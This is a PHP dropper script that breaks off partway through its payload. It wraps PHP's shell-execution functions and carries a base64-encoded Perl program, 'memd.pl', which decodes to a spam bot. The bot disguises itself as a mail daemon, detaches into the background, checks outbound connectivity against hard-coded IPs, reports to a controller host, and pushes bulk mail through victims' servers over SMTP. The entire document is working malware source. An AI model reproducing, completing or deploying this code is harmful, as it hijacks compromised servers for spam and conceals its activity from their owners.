function fn_system($i){$o="";ob_start();system($i);$o=ob_get_clean();return $o;}
function fn_exec($i){$o="";exec($i,$o);$o=implode("",$o);return $o;}
function fn_passthru($i){$o="";ob_start();passthru($i);$o=ob_get_clean();return $o;}
function fn_shellexec($i){$o="";$o=shell_exec($i);return $o;}
function fn_popen($i){$o="";if(is_resource($h=popen($i,"r"))){while(!feof($h)){$o.=fread($h,1024);}pclose($h);}return $o;}
function fn_procopen($i,$d){$o="";if(is_resource($h=proc_open($i,array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")),$p))){fwrite($p[0],$d);fclose($p[0]);while(!feof($p[1])){$o.=fread($p[1],1024);}fclose($p[1]);proc_close($h);}return $o;}
function main()
{
$u='%%SHELL_URLDIR%%';
$n='memd.pl';
$s=base64_decode("IyEvdXNyL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7IHVzZSBJTzo6U29ja2V0OyB1c2UgSU86OlNlbGVj
dDsgbXkgQGZwcyA9ICgicG9zdGZpeCIsICJleGltIiwgInNlbmRtYWlsIik7IG15ICRucHMgPSAk
ZnBzW2ludCByYW5kIHNjYWxhciBAZnBzXTsgJDAgPSAkbnBzOyAkfCA9IDE7Cm15ICRld2Jsb2Nr
ID0gMTE7IG15ICRlaXByb2dyID0gMTUwOwppZiAoJF5PIGVxICJsaW51eCIpIHsgJGV3YmxvY2sg
PSAxMTsgJGVpcHJvZ3IgPSAxMTU7IH0KaWYgKCReTyBlcSAiZnJlZWJzZCIpIHsgJGV3YmxvY2sg
PSAzNTsgJGVpcHJvZ3IgPSAzNjsgfQppZiAoJF5PIGVxICJNU1dpbjMyIikgeyAkZXdibG9jayA9
IDEwMDM1OyAkZWlwcm9nciA9IDEwMDM2OyB9Cm15ICR0ZXN0ID0gewpvcyA9PiBbJF5PXSwKaXAg
PT4gWyIwLjAuMC4wIiwgIjIxNi4xNDYuNDMuNzAiLCAiNzcuODguNTUuNjAiXSwKdGNwMjUgPT4g
WzAsICI2Ny4xOTUuMjI5LjU4IiwgIjc0LjYuMTQxLjQwIiwgIjEwNC40Ny4zNC4zMyJdLAp1ZHA1
MyA9PiBbMCwgIjIwNS4xODguMTU3LjIzMiIsICI2NC4xMi41MS4xMzIiXSwKdGNwNTMgPT4gWzAs
ICIyMDUuMTg4LjE1Ny4yMzIiLCAiNjQuMTIuNTEuMTMyIl0sCnRjcDgwID0+IFswLCAiMjE2LjE0
Ni40My43MCIsICI3Ny44OC41NS42MCJdCn07ICZpbml0KCk7ICRfID0gJ0ptNycuJzN1Wic7IHBy
aW50ICJDb250ZW50LXR5cGU6IHRleHQvcGxhaW47IGNoYXJzZXQ9aXNvLTg4NTktMVx4MERceDBB
XHgwRFx4MEEkXyI7IGV4aXQgMDsKc3ViIG1haW4KewpteSAkc19ob3N0ID0gc2hpZnQ7IG15ICRz
X3BvcnQgPSBzaGlmdDsgbXkgJHNfcGF0aCA9IHNoaWZ0OyBteSAkc19uc2V4ID0gc2hpZnQ7Cmlm
ICgkXk8gbmUgIk1TV2luMzIiKQp7CnVzZSBQT1NJWCBxdyhzZXRzaWQpOwpyZXR1cm4gdW5sZXNz
IGRlZmluZWQgKG15ICRjaGlsZCA9IGZvcmspOwpyZXR1cm4gaWYgJGNoaWxkOwpQT1NJWDo6c2V0
c2lkKCk7CiRTSUd7JF99ID0gIklHTk9SRSIgZm9yIChxdyAoSFVQIElOVCBJTEwgRlBFIFFVSVQg
QUJSVCBVU1IxIFNFR1YgVVNSMiBQSVBFIEFMUk0gVEVSTSBDSExEKSk7CnVtYXNrIDA7CmNoZGly
ICIvIjsKb3BlbiAoU1RESU4sICI8L2Rldi9udWxsIik7Cm9wZW4gKFNURE9VVCwgIj4vZGV2L251
bGwiKTsKb3BlbiAoU1RERVJSLCAiPiZTVERPVVQiKTsKfQomdGVzdCgpOwpleGl0IDAgaWYgJHRl
c3QtPnt0Y3AyNX1bMF0gIT0gMTsKIyBpZiAoJHRlc3QtPnt1ZHA1M31bMF0gIT0gMSAmJiAkdGVz
dC0+e3RjcDUzfVswXSAhPSAxKSB7IGV4aXQgMCBpZiAhZGVmaW5lZCAkc19uc2V4OyAkc19uc2V4
ID0gcGFjayAoIkM0Iiwgc3BsaXQgKC9cLi8sICRzX25zZXgpKTsgfSBlbHNlIHsgJHNfbnNleCA9
IHVuZGVmOyB9CnNyYW5kOyBteSAkcGlkID0gJCQ7ICRwaWQgPSAxICsgaW50IHJhbmQgMjE0NzQ4
MzY0OCBpZiAhZGVmaW5lZCAkcGlkIHx8ICRwaWQgIX4gL15cZCskLyB8fCAkcGlkID4gNDI5NDk2
NzI5NTsKbXkgJHMgPSB7dmVyc2lvbiA9PiAxMTIsIGNvbW1hbmQgPT4gMCwgc2l6ZSA9PiAwLCB0
aW1lb3V0ID0+IDYwLCByZXF1ZXN0ID0+IDEsIGhvc3QgPT4gcGFjayAoIkM0Iiwgc3BsaXQgKC9c
Li8sICRzX2hvc3QpKX07Cm15ICRiID0KewppZAkJCT0+IDAsCmlwCQkJPT4gIiIsCmhlbG8JCT0+
IHVuZGVmLAp0aW1lem9uZQk9PiBbWyIrIiwgIi0iXS0+W2ludCByYW5kIDJdLCAoMSArIGludCBy
YW5kIDYpXSwKbmFtZXNlcnZlcgk9PiBbXSwKdGltZW91dAkJPT4gMTAsCnNlc3Npb24JCT0+IDAs
CmNvcGllcwkJPT4gMSwKbWV0aG9kCQk9PiAwLApzcGYJCQk9PiAwLApsZXZlbAkJPT4gMCwKbWFp
bGJhc2UJPT4gW10sCmZyb20JCT0+IFtdLApyZXBseXRvCQk9PiBbXSwKc3ViamVjdAkJPT4gW10s
CmhlYWRlcgkJPT4gIiIsCmxldHRlcgkJPT4gIiIsCnByaW9yaXR5CT0+IDEsCnR5cGUJCT0+IDAs
CmNoYXJzZXQJCT0+ICIiLApnb29kCQk9PiBbMCwgIiJdLAp1bmx1Y2t5CQk9PiBbMCwgIiJdLApi
YWQJCQk9PiBbMCwgIiJdLApyZXBvcnQJCT0+ICIiCn07Cm15ICRyZWFkZXJzID0gSU86OlNlbGVj
dC0+bmV3KCkgb3IgZXhpdCAwOwpteSAkd3JpdGVycyA9IElPOjpTZWxlY3QtPm5ldygpIG9yIGV4
aXQgMDsKbXkgJHNlc3Npb24gPSB7fTsKbXkgJGZsYWdzZXQgPSB7dGltZW91dCA9PiAxfTsKbXkg
JGNhY2hlID0ge307Cm15ICRyZXNldF90aW1lID0gdGltZTsKbXkgJHJlc2V0X3dhaXQgPSAxMjA7
Cm15ICRyZXNldF9zdGF0ID0gMDsKbXkgJGZpcnN0X2V4ZWMgPSAxOwpteSAkcmVxdWVzdF90aW1l
ID0gdGltZTsKbXkgJHJlcXVlc3RfZmxhZyA9IDE7Cm15ICRjb3VudGVyX2FkZHIgPSAwOwpteSAk
ZGVzdHJveSA9IHN1Ygp7Cm15ICgkb2JqZWN0LCAkaGFuZGxlKSA9IEBfOwppZiAoJHNlc3Npb24t
PnskaGFuZGxlfXtzdGF0dXN9ID1+IC9ecnMvKQp7CiRyZXF1ZXN0X2ZsYWcgPSAxOwp9CmVsc2lm
IChleGlzdHMgJHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9KQp7CmlmICgkXyA9IHNoaWZ0IEB7
JHNlc3Npb24tPnskaGFuZGxlfXtvYmplY3R9fSkKewokYi0+e3VubHVja3l9WzBdICsrOwppZiAo
JGItPntsZXZlbH0pCnsKJGItPnt1bmx1Y2t5fVsxXSAuPSAiJF9ceDBBIjsKJGItPntyZXBvcnR9
IC49ICIkXyAtIFskc2Vzc2lvbi0+eyRoYW5kbGV9e3N0YXR1c31dIFRpbWVvdXRceDBBIiBpZiAk
Yi0+e2xldmVsfSA+IDE7Cn0KcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJHNlc3Npb24tPnskaGFu
ZGxlfXtvYmplY3R9IGlmIHNjYWxhciBAeyRzZXNzaW9uLT57JGhhbmRsZX17b2JqZWN0fX07Cn0K
fQppZiAoZXhpc3RzICRzZXNzaW9uLT57JGhhbmRsZX17bXh9KQp7CiRjYWNoZS0+eyRzZXNzaW9u
LT57JGhhbmRsZX17bXh9fVsxXSAtLSBpZiAkY2FjaGUtPnskc2Vzc2lvbi0+eyRoYW5kbGV9e214
fX1bMV0gPiAwOwp9CmRlbGV0ZSAkc2Vzc2lvbi0+eyRoYW5kbGV9Owokb2JqZWN0LT5yZW1vdmUo
JGhhbmRsZSk7CmNsb3NlICRoYW5kbGU7Cn07CndoaWxlICgxKQp7CklPOjpTZWxlY3QtPnNlbGVj
dCh1bmRlZiwgdW5kZWYsIHVuZGVmLCAwLjAxKTsKbXkgJHRpbWUgPSB0aW1lOwppZiAoJHJlc2V0
X3N0YXQgIT0gKCRiLT57Z29vZH1bMF0gKyAkYi0+e3VubHVja3l9WzBdICsgJGItPntiYWR9WzBd
KSkKewokcmVzZXRfc3RhdCA9ICgkYi0+e2dvb2R9WzBdICsgJGItPnt1bmx1Y2t5fVswXSArICRi
LT57YmFkfVswXSk7CiRyZXNldF90aW1lID0gJHRpbWUgKyAkcmVzZXRfd2FpdDsKfQppZiAoJHRp
bWUgPj0gJHJlc2V0X3RpbWUpCnsKJHJlc2V0X3RpbWUgPSAkdGltZSArICRyZXNldF93YWl0Owok
cmVzZXRfc3RhdCA9IDA7CiRjb3VudGVyX2FkZHIgPSAwOwokYi0+eyRffSA9IFtdIGZvciAocXcg
KG1haWxiYXNlIGZyb20gcmVwbHl0byBzdWJqZWN0KSk7CiRiLT57JF99ID0gWzAsICIiXSBmb3Ig
KHF3IChnb29kIHVubHVja3kgYmFkKSk7CiRiLT57cmVwb3J0fSA9ICIiOwokY2FjaGUgPSB7fTsK
JHNlc3Npb24gPSB7fTsKbXkgJGhhID0gWyR3cml0ZXJzLT5oYW5kbGVzXTsKZm9yZWFjaCBteSAk
aHMgKEAkaGEpIHsgJHdyaXRlcnMtPnJlbW92ZSgkaHMpOyBjbG9zZSAkaHM7IH0KJGhhID0gWyRy
ZWFkZXJzLT5oYW5kbGVzXTsKZm9yZWFjaCBteSAkaHMgKEAkaGEpIHsgJHJlYWRlcnMtPnJlbW92
ZSgkaHMpOyBjbG9zZSAkaHM7IH0KJHJlcXVlc3RfZmxhZyA9IDE7CiRyZXF1ZXN0X3RpbWUgPSB0
aW1lOwpuZXh0Owp9CmlmICgkcmVxdWVzdF9mbGFnICYmICR0aW1lID49ICRyZXF1ZXN0X3RpbWUp
CnsKd2hpbGUgKDEpCnsKbXkgJHNvY2tldCA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9
PiAidGNwIiwgVHlwZSA9PiBTT0NLX1NUUkVBTSk7Cmxhc3QgdW5sZXNzICRzb2NrZXQ7CmlmICgk
Xk8gZXEgIk1TV2luMzIiKSB7IGlvY3RsICgkc29ja2V0LCAweDgwMDQ2NjdlLCBwYWNrICgiTCIs
IDEpKTsgfSBlbHNlIHsgJHNvY2tldC0+YmxvY2tpbmcoMCk7IH0KdW5sZXNzICgkc29ja2V0LT5j
b25uZWN0KCRfID0gc29ja2FkZHJfaW4oJHNfcG9ydCwgJHMtPntob3N0fSkpKQp7CmlmICgkISAh
PSAkZWlwcm9nciAmJiAkISAhPSAkZXdibG9jaykKewpjbG9zZSAkc29ja2V0OwpsYXN0Owp9Cn0K
dW5sZXNzICgkd3JpdGVycy0+YWRkKCRzb2NrZXQpKQp7CmNsb3NlICRzb2NrZXQ7Cmxhc3Q7Cn0K
JHNlc3Npb24tPnskc29ja2V0fSA9CnsKc3RhdHVzCT0+ICJyc19jbiIsCmJ1ZmZlcgk9PiAiIiwK
ZmxhZ3NldAk9PiAkZmxhZ3NldC0+e3RpbWVvdXR9LAp0aW1lb3V0CT0+IDAKfTsKJHMtPnskX30g
PSAwIGZvciAocXcgKGNvbW1hbmQgc2l6ZSkpOwppZiAoJGNvdW50ZXJfYWRkciA8PSAoJGItPntn
b29kfVswXSArICRiLT57dW5sdWNreX1bMF0gKyAkYi0+e2JhZH1bMF0pKQp7CiRzLT57Y29tbWFu
ZH0gPSAxOwokcy0+e2NvbW1hbmR9ID0gMiBpZiAkZmlyc3RfZXhlYzsKJHJlc2V0X3RpbWUgPSAk
dGltZSArICRyZXNldF93YWl0OwokcmVzZXRfc3RhdCA9IDA7CmlmICgkY291bnRlcl9hZGRyKQp7
CiRzLT57c2l6ZX0gPSAxNjsKJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9IC49IHBhY2sgKCJM
IiwgJGItPntpZH0pOwokc2Vzc2lvbi0+eyRzb2NrZXR9e2J1ZmZlcn0gLj0gcGFjayAoIkwiLCAk
Yi0+eyRffVswXSkgZm9yIChxdyAoZ29vZCB1bmx1Y2t5IGJhZCkpOwppZiAoJGItPntsZXZlbH0p
CnsKZm9yIChxdyAoZ29vZCB1bmx1Y2t5IGJhZCkpCnsKJHMtPntzaXplfSArPSAoNCArIGxlbmd0
aCAkYi0+eyRffVsxXSk7CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfSAuPSBwYWNrICgiTCIs
IGxlbmd0aCAkYi0+eyRffVsxXSk7CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfSAuPSAkYi0+
eyRffVsxXTsKfQppZiAoJGItPntsZXZlbH0gPiAxKQp7CiRzLT57c2l6ZX0gKz0gKDQgKyBsZW5n
dGggJGItPntyZXBvcnR9KTsKJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9IC49IHBhY2sgKCJM
IiwgbGVuZ3RoICRiLT57cmVwb3J0fSk7CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfSAuPSAk
Yi0+e3JlcG9ydH07Cn0KfQp9Cn0KJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9ID0gcGFjayAo
IlNDMkwyIiwgMHgxMjM0LCAkcy0+e3ZlcnNpb259LCAkcy0+e2NvbW1hbmR9LCAkcGlkLCAkcy0+
e3NpemV9KSAuICRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfTsKJHMtPntzaXplfSA9IGxlbmd0
aCAkc2Vzc2lvbi0+eyRzb2NrZXR9e2J1ZmZlcn07CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVy
fSA9ICJFSExPIGxvY2FsaG9zdFx4MERceDBBJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9IjsK
JHJlcXVlc3RfZmxhZyA9IDA7Cmxhc3Q7Cn0KfQppZiAobXkgJG1haWxfYXJyYXkgPSBzaGlmdCBA
eyRiLT57bWFpbGJhc2V9fSkKewp3aGlsZSAoc2NhbGFyIEAkbWFpbF9hcnJheSkKewpteSAkbWFp
bCA9IEB7JG1haWxfYXJyYXl9WzBdOwpteSAoJG14KSA9ICZtYWlsKFwkbWFpbCk7CiRteCA9IGxj
ICgoc3BsaXQgL1xALywgJCRteClbMV0pOwpteSAkdHlwZSA9IDE1OwppZiAoZXhpc3RzICRjYWNo
ZS0+eyRteH0pCnsKbXkgJHN2ID0gJG14OwokbXggPSAkY2FjaGUtPnskc3Z9WzBdOwppZiAoJG14
ID1+IC9eKFxkKylcLihcZCspXC4oXGQrKVwuKFxkKykkLykKewokY2FjaGUtPnskc3Z9WzFdID0g
MCB1bmxlc3MgJGNhY2hlLT57JHN2fVsxXTsKaWYgKCRiLT57c2Vzc2lvbn0gJiYgKCRjYWNoZS0+
eyRzdn1bMV0gPj0gJGItPntzZXNzaW9ufSkpCnsKcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJG1h
aWxfYXJyYXk7Cmxhc3Q7Cn0KaWYgKCQxID4gMjU1IHx8ICQyID4gMjU1IHx8ICQzID4gMjU1IHx8
ICQ0ID4gMjU1KQp7CndoaWxlICgkXyA9IHNoaWZ0IEAkbWFpbF9hcnJheSkKewokYi0+e2JhZH1b
MF0gKys7CmlmICgkYi0+e2xldmVsfSkKewokYi0+e2JhZH1bMV0gLj0gIiRfXHgwQSI7CiRiLT57
cmVwb3J0fSAuPSAiJF8gLSBbbXhfaXBdIE9iamVjdCBub24gZXhpc3RzXHgwQSIgaWYgJGItPnts
ZXZlbH0gPiAxOwp9Cn0KbGFzdDsKfQokbXggPSBwYWNrICgiQzQiLCAkMSwgJDIsICQzLCAkNCk7
Cm15ICRzb2NrZXQgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG8gPT4gInRjcCIsIFR5cGUg
PT4gU09DS19TVFJFQU0pOwp1bmxlc3MgKCRzb2NrZXQpCnsKcHVzaCBAeyRiLT57bWFpbGJhc2V9
fSwgJG1haWxfYXJyYXk7Cmxhc3Q7Cn0KaWYgKCReTyBlcSAiTVNXaW4zMiIpIHsgaW9jdGwgKCRz
b2NrZXQsIDB4ODAwNDY2N2UsIHBhY2sgKCJMIiwgMSkpOyB9IGVsc2UgeyAkc29ja2V0LT5ibG9j
a2luZygwKTsgfQp1bmxlc3MgKCRzb2NrZXQtPmNvbm5lY3QoJF8gPSBzb2NrYWRkcl9pbigyNSwg
JG14KSkpCnsKaWYgKCQhICE9ICRlaXByb2dyICYmICQhICE9ICRld2Jsb2NrKQp7CmNsb3NlICRz
b2NrZXQ7CiRiLT57dW5sdWNreX1bMF0gKys7CmlmICgkYi0+e2xldmVsfSkKewokYi0+e3VubHVj
a3l9WzFdIC49ICIkbWFpbFx4MEEiOwokYi0+e3JlcG9ydH0gLj0gIiRtYWlsIC0gW214X2NuXSBD
YW4ndCBjb25uZWN0XHgwQSIgaWYgJGItPntsZXZlbH0gPiAxOwp9CnNoaWZ0IEAkbWFpbF9hcnJh
eTsKcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJG1haWxfYXJyYXkgaWYgc2NhbGFyIEAkbWFpbF9h
cnJheTsKbGFzdDsKfQp9CnVubGVzcyAoJHdyaXRlcnMtPmFkZCgkc29ja2V0KSkKewpjbG9zZSAk
c29ja2V0OwpwdXNoIEB7JGItPnttYWlsYmFzZX19LCAkbWFpbF9hcnJheTsKbGFzdDsKfQokY2Fj
aGUtPnskc3Z9WzFdICsrOwpteSAkc2VuZGVyID0gQHskYi0+e2Zyb219fVtpbnQgcmFuZCBzY2Fs
YXIgQHskYi0+e2Zyb219fV07CiRzZW5kZXIgPX4gcy9cQC4rJC9cQCRiLT57aGVsb30vIGlmICgk
Yi0+e3NwZn0gJiYgJGItPntoZWxvfSBuZSAibG9jYWxob3N0Iik7CiRzZXNzaW9uLT57JHNvY2tl
dH0gPQp7CnN0YXR1cwk9PiAibXhfY24iLApteAkJPT4gJHN2LApidWZmZXIJPT4gIiIsCm9iamVj
dAk9PiAkbWFpbF9hcnJheSwKbWluZGV4CT0+IDAsCnNlbmRlcgk9PiAkc2VuZGVyLApmbGFnc2V0
CT0+ICRmbGFnc2V0LT57dGltZW91dH0sCnRpbWVvdXQJPT4gMAp9OwpsYXN0Owp9CmVsc2UKewok
dHlwZSA9IDE7Cn0KfQplbHNlCnsKJHR5cGUgPSAxNTsKfQpteSAkc29ja2V0OwppZiAoJHRlc3Qt
Pnt1ZHA1M31bMF0gPT0gMSkKewokc29ja2V0ID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3Rv
ID0+ICJ1ZHAiKTsKfQplbHNlCnsKJHNvY2tldCA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90
byA9PiAidGNwIiwgVHlwZSA9PiBTT0NLX1NUUkVBTSk7Cn0KdW5sZXNzICgkc29ja2V0KQp7CnB1
c2ggQHskYi0+e21haWxiYXNlfX0sICRtYWlsX2FycmF5OwpsYXN0Owp9CmlmICgkXk8gZXEgIk1T
V2luMzIiKSB7IGlvY3RsICgkc29ja2V0LCAweDgwMDQ2NjdlLCBwYWNrICgiTCIsIDEpKTsgfSBl
bHNlIHsgJHNvY2tldC0+YmxvY2tpbmcoMCk7IH0KaWYgKCR0ZXN0LT57dWRwNTN9WzBdID09IDAp
CnsKbXkgJG5hbWVzZXJ2ZXIgPSBzaGlmdCBAeyRiLT57bmFtZXNlcnZlcn19OyBwdXNoIEB7JGIt
PntuYW1lc2VydmVyfX0sICRuYW1lc2VydmVyOwppZiAoZGVmaW5lZCAkc19uc2V4KSB7ICRuYW1l
c2VydmVyID0gc29ja2FkZHJfaW4oMjUsICRzX25zZXgpOyB9IGVsc2UgeyAkbmFtZXNlcnZlciA9
IHNvY2thZGRyX2luKDUzLCAkbmFtZXNlcnZlcik7IH0KdW5sZXNzICgkc29ja2V0LT5jb25uZWN0
KCRuYW1lc2VydmVyKSkKewppZiAoJCEgIT0gJGVpcHJvZ3IgJiYgJCEgIT0gJGV3YmxvY2spCnsK
Y2xvc2UgJHNvY2tldDsKJGItPnt1bmx1Y2t5fVswXSArKzsKaWYgKCRiLT57bGV2ZWx9KQp7CiRi
LT57dW5sdWNreX1bMV0gLj0gIiRtYWlsXHgwQSI7CiRiLT57cmVwb3J0fSAuPSAiJG1haWwgLSBb
bnNfY25dIENhbid0IGNvbm5lY3RceDBBIiBpZiAkYi0+e2xldmVsfSA+IDE7Cn0Kc2hpZnQgQCRt
YWlsX2FycmF5OwpwdXNoIEB7JGItPnttYWlsYmFzZX19LCAkbWFpbF9hcnJheSBpZiBzY2FsYXIg
QCRtYWlsX2FycmF5OwpsYXN0Owp9Cn0KfQp1bmxlc3MgKCR3cml0ZXJzLT5hZGQoJHNvY2tldCkp
CnsKY2xvc2UgJHNvY2tldDsKcHVzaCBAeyRiLT57bWFpbGJhc2V9fSwgJG1haWxfYXJyYXk7Cmxh
c3Q7Cn0KJHNlc3Npb24tPnskc29ja2V0fSA9CnsKc3RhdHVzCT0+ICJuc193ciIsCmJ1ZmZlcgk9
PiAiIiwKb2JqZWN0CT0+ICRtYWlsX2FycmF5LApzZW5kZXIJPT4gMCwKZmxhZ3NldAk9PiAkZmxh
Z3NldC0+e3RpbWVvdXR9LAp0aW1lb3V0CT0+IDAsCnR5cGUJPT4gJHR5cGUsCnBhY2tldAk9PiBp
bnQgcmFuZCA2NTUzNiwKc2l6ZQk9PiAwCn07CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfSAu
PSBwYWNrICgiblNuNCIsICRzZXNzaW9uLT57JHNvY2tldH17cGFja2V0fSwgMSwgMSwgMCwgMCwg
MCk7CiRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVyfSAuPSBwYWNrICgiQyIsIGxlbmd0aCAkXykg
LiAkXyBmb3IgKHNwbGl0ICgvXC4vLCAkbXgpKTsKJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9
IC49IHBhY2sgKCJDbjIiLCAwLCAkc2Vzc2lvbi0+eyRzb2NrZXR9e3R5cGV9LCAxKTsKJHNlc3Np
b24tPnskc29ja2V0fXtzZW5kZXJ9ID0gbGVuZ3RoICRzZXNzaW9uLT57JHNvY2tldH17YnVmZmVy
fTsKaWYgKCR0ZXN0LT57dWRwNTN9WzBdID09IDApCnsKJHNlc3Npb24tPnskc29ja2V0fXtzdGF0
dXN9ID0gIm5zX2NuIjsKJHNlc3Npb24tPnskc29ja2V0fXtidWZmZXJ9ID0gam9pbiAoIiIsIHBh
Y2sgKCJuIiwgJHNlc3Npb24tPnskc29ja2V0fXtzZW5kZXJ9KSwgJHNlc3Npb24tPnskc29ja2V0
fXtidWZmZXJ9KTsKfQpsYXN0Owp9Cn0KZWxzaWYgKCRjb3VudGVyX2FkZHIgJiYgIXNjYWxhciBr
ZXlzICUkc2Vzc2lvbikKewokY291bnRlcl9hZGRyID0gKCRiLT57Z29vZH1bMF0gKyAkYi0+e3Vu
bHVja3l9WzBdICsgJGItPntiYWR9WzBdKSBpZiAkY291bnRlcl9hZGRyID4gKCRiLT57Z29vZH1b
MF0gKyAkYi0+e3VubHVja3l9WzBdICsgJGItPntiYWR9WzBdKTsKJHJlcXVlc3RfdGltZSA9ICR0
aW1lIGlmICRjb3VudGVyX2FkZHIgPD0gKCRiLT57Z29vZH1bMF0gKyAkYi0+e3VubHVja3l9WzBd
ICsgJGItPntiYWR9WzBdKTsKfQpteSAkd3JpdGFibGUgPSBbJHdyaXRlcnMtPmhhbmRsZXNdOwpm
b3JlYWNoIG15ICRoYW5kbGUgKEAkd3JpdGFibGUpCnsKaWYgKCRzZXNzaW9uLT57JGhhbmRsZX17
ZmxhZ3NldH0gJiAkZmxhZ3NldC0+e3RpbWVvdXR9KQp7CmlmICgkc2Vzc2lvbi0+eyRoYW5kbGV9
e3N0YXR1c30gPX4gL15ycy8pCnsKJHNlc3Npb24tPnskaGFuZGxlfXt0aW1lb3V0fSA9ICR0aW1l
ICsgJHMtPnt0aW1lb3V0fTsKfQplbHNlCnsKJHNlc3Npb24tPnskaGFuZGxlfXt0aW1lb3V0fSA9
ICR0aW1lICsgJGItPnt0aW1lb3V0fTsKfQokc2Vzc2lvbi0+eyRoYW5kbGV9e2ZsYWdzZXR9IF49
ICRmbGFnc2V0LT57dGltZW91dH07Cn0KZWxzaWYgKCR0aW1lID49ICRzZXNzaW9uLT57JGhhbmRs
ZX17dGltZW91dH0pCnsKJGRlc3Ryb3ktPigkd3JpdGVycywgJGhhbmRsZSk7Cn0KfQokd3JpdGFi
bGUgPSAoSU86OlNlbGVjdC0+c2VsZWN0KHVuZGVmLCAkd3JpdGVycywgdW5kZWYsIDApKVsxXTsK
Zm9yZWFjaCBteSAkaGFuZGxlIChAJHdyaXRhYmxlKQp7CmlmICgkc2Vzc2lvbi0+eyRoYW5kbGV9
e3N0YXR1c30gPX4gL2NuJC8pCnsKaWYgKCRoYW5kbGUtPmNvbm5lY3RlZCkKewppZiAoJHNlc3Np
b24tPnskaGFuZGxlfXtzdGF0dXN9IGVxICJyc19jbiIpCnsKJHNlc3Npb24tPnskaGFuZGxlfXtz
dGF0dXN9ID0gInJzX3dyIjsKfQplbHNpZiAoJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9IGVx
ICJuc19jbiIpCnsKJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9ID0gIm5zX3dyIjsKfQplbHNl
CnsKJHNlc3Npb24tPnskaGFuZGxlfXtzdGF0dXN9ID0gIm14X3JkIjsKdW5sZXNzICgkcmVhZGVy
cy0+YWRkKCRoYW5kbGUpKQp7CiRkZXN0cm95LT4oJHdyaXRlcnMsICRoYW5kbGUpOwpuZXh0Owp9
CiR3cml0ZXJzLT5yZW1vdmUoJGhhbmRsZSk7Cn0KfQplbHNlCnsKJGRlc3Ryb3ktPigkd3JpdGVy
cywgJGhhbmRsZSk7Cn0KfQplbHNlCnsKbXkgJHJlc3VsdDsKaWYgKCRzZXNzaW9uLT57JGhhbmRs
ZX17c3RhdHVzfSBlcSAibnNfd3IiKQp7CmlmICgkdGVzdC0+e3VkcDUzfVswXSA9PSAwKQp7CiRy
ZXN1bHQgPSAkaGFuZGxlLT5zZW5kKCRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSk7Cn0KZWxz
ZQp7Cm15ICRuYW1lc2VydmVyID0gc2hpZnQgQHskYi0+e25hbWVzZXJ2ZXJ9fTsgcHVzaCBAeyRi
LT57bmFtZXNlcnZlcn19LCAkbmFtZXNlcnZlcjsKJHJlc3VsdCA9ICRoYW5kbGUtPnNlbmQoJHNl
c3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCAwLCAkXyA9IHNvY2thZGRyX2luKDUzLCAkbmFtZXNl
cnZlcikpOwp9Cn0KZWxzZQp7CiRyZXN1bHQgPSBzeXN3cml0ZSAoJGhhbmRsZSwgJHNlc3Npb24t
PnskaGFuZGxlfXtidWZmZXJ9KTsKfQppZiAoZGVmaW5lZCAkcmVzdWx0ICYmICRyZXN1bHQgPiAw
KQp7CnN1YnN0ciAoJHNlc3Npb24tPnskaGFuZGxlfXtidWZmZXJ9LCAwLCAkcmVzdWx0KSA9ICIi
OwppZiAobGVuZ3RoICRzZXNzaW9uLT57JGhhbmRsZX17YnVmZmVyfSA8IDEpCnsKaWYgKCRzZXNz
aW9uLT57JGhhbmRsZX17c3RhdHVzfSBlcSAicnNfd3IiKQp7CiRzZXNzaW9uLT57JGhhbmRsZX17
c3RhdHVzfSA9ICJyc19yZCI7CmlmICgkcy0+e2NvbW1hbmR9ICYmICRjb3VudGVyX2FkZHIgJiYg
KCRjb3VudGVyX2FkZHIgPD0gKCRiLT57Z29vZH1bMF0gKyAkYi0+e3VubHVja3l9WzBdICsgJGIt
PntiYWR9WzBdKSkpCnsKJGNvdW50ZXJfYWRkciA9IDA7CiRiLT57JF99ID0gW10gZm9yIChxdyAo
bWFpbGJhc2UgZnJvbSByZXBseXRvIHN1YmplY3QpKTsKJGItPnskX30gPSBbMCwgIiJdIGZvciAo
cXcgKGdvb2QgdW5sdWNreSBiYWQpKTsKJGItPntyZXBvcnR9ID0gIiI7CiRjYWNoZSA9IHt9Owp9
CiRyZXF1ZXN0X3RpbWUgPSAkdGltZSArICRzLT57cmVxdWVzdH0gKiA2MDsKfQplbHNpZiAoJHNl
c3Npb24tPnskaGFuZGxlfXtzdGF0dXN9IGVxICJuc193ciIpCnsKJHNlc3Npb24tPnskaGFuZGxl
fXtzdGF0dXN9ID0gIm5zX3JkIjsKfQp1bmxlc3MgKCRyZWFkZXJzLT5hZGQoJGhhbmRsZSkpCnsK
JGRlc3Ryb3ktPigkd3JpdGVycywgJGhhbmRsZSk7Cm5leHQ7Cn0KJHdyaXRlcnMtPnJlbW92ZSgk
aGFuZGxlKTsKfQp9CmVsc2lmICgkISA9PSAkZXdibG9jaykKewpuZXh0Owp9CmVsc2UKewokZGVz
dHJveS0+KCR3cml0ZXJzLCAkaGFuZGxlKTsKfQp9Cn0KbXkgJHJlYWRhYmxlID0gWyRyZWFkZXJz
